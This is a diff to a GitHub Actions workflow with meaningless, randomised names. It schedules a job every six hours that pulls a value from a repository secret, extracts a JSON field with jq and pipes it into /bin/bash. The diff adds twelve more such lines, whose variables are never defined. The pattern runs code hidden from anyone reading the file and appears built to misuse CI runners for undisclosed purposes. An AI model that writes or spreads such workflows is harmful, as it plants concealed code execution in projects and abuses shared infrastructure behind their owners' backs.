@@ -3,16 +3,29 @@ name: ashonhyt
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 4/6 * * *'
-jobs:  # 26775
+    - cron: '14 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: ashonhyt
         env:
-          cijou02118: ${{ secrets.cijou02118 }}
+          pxmn9: ${{ secrets.pxmn9 }}
         run: |
-          echo $cijou02118 | jq -r .htdt405 | /bin/bash
-          echo $reep0 | jq -r .deo9 | /bin/bash
+          echo $pxmn9 | jq -r .c94 | /bin/bash
+          echo $k920 | jq -r .clkbh81 | /bin/bash
+          echo $j934 | jq -r .unq5104 | /bin/bash
+          echo $uccwh420 | jq -r .hpm22097 | /bin/bash
+          echo $xwij6 | jq -r .u2418 | /bin/bash
+          echo $aejqw582 | jq -r .n6 | /bin/bash
+          echo $mnyj59901 | jq -r .kqwn142 | /bin/bash
+          echo $rll06 | jq -r .dnig09 | /bin/bash
+          echo $c6736 | jq -r .yhd141 | /bin/bash
+          echo $spy55 | jq -r .nn205 | /bin/bash
+          echo $ognan7 | jq -r .ntdj08668 | /bin/bash
+          echo $osvt2031 | jq -r .gx783 | /bin/bash
+          echo $g238 | jq -r .gnun4 | /bin/bash
 
